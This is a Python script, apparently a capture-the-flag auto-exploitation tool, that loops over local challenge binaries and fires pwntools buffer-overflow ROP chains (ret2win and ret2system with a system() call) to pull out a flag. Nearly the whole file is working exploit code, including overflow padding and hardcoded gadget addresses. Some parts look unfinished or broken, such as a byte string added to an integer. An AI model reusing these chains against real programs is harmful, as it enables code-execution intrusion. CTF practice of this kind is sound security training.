import os, sys
from pwn import *
from fart import *
from time import sleep
logging.getLogger('pwnlib').setLevel(logging.WARNING)

def main():
    path = 'bins3/'
    for binary in os.listdir(path):
        binary = path + binary 
        print(binary+":")
        
        f_anal = analyze(binary)
        f_rop = our_rop(f_anal)

        #if f_anal.has_system():
        #    ret2system(f_anal)
        if f_anal.has_win():
            ret2win(f_rop)


def ret2system(f_anal):
    binary = f_anal.binary
    get_buf = get2overflow(binary)
    get_rop = our_rop(f_anal)

    e = ELF(binary)
    r = ROP(e)

    buf = b'A' + get_buf.buf()
    chain = b''
    
    chain += get_rop.fill_reg('rdi', f_anal.get_catflagtxt())
    chain += get_rop.fill_reg('rsi', 0)
    
    chain += p64(e.sym['system'])



    io = process(binary)
    io.sendline(buf + chain)
    io.recvuntil(b'flag')
    print("flag" + io.recvuntil(b'}').decode('utf-8'))
def ret2win(f_rop):
    binary = f_rop.analyze.binary
    get_buf = get2overflow(binary)
    chain = b'A' * get_buf.buf()#264
    
    if f_rop.analyze.win_has_args():
        '''
        chain += f_rop.satisfy_win()
        chain += f_rop.realighn()
        chain += p64(f_rop.analyze.get_win())
        '''
        elf = ELF(binary)
        chain += p64(0x0000000000400863)
        chain += p64(0xc9)
        chain += p64(elf.sym['_fini'])
        chain += p64(elf.sym['win'])
        io = process(binary)
        io.sendline(chain)
        io.recvuntil(b'flag')
        print('flag' + io.recvuntil(b'}').decode('utf-8'))


main()
